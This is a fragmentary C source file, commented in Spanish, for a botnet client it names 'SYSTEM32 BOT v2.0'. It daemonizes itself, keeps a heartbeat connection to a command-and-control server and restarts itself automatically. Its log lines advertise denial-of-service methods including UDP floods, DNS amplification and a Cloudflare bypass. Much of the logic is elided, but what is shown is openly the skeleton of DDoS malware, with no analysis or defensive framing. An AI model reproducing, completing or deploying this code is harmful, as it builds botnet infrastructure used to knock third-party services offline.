...
void run_bot_logic() {
    ...
    while(1) {
        ...
        // HEARTBEAT
        send(sock, "HEARTBEAT:x86_64", 15, MSG_NOSIGNAL);
        
        // Recibir BOT_ID del CNC
        char init_buf[256];
        ...
        close(sock);
        log_msg("Disconnected from CNC");
        sleep(3);
    }
}

int main() {
    // 1. Daemonizar (correr en background)
    if(fork() > 0) return 0;
    
    // 2. Desconectar de terminal
    setsid();
    
    // 3. Loop principal con reinicio automático
    while(1) {
        log_msg("=== SYSTEM32 BOT v2.0 STARTING ===");
        log_msg("Methods: TCPKILLER, UDPFLOOD, UDPPPS, DNSAMP, HTTPS, CFBYPASS");
        ...
        if(pid == 0) {
            ...
            // Proceso PADRE - espera que hijo muera
            int status;
            waitpid(pid, &status, 0);
            
            log_msg("Bot stopped. Restarting in 3 seconds...");
            sleep(3);
        }
    }
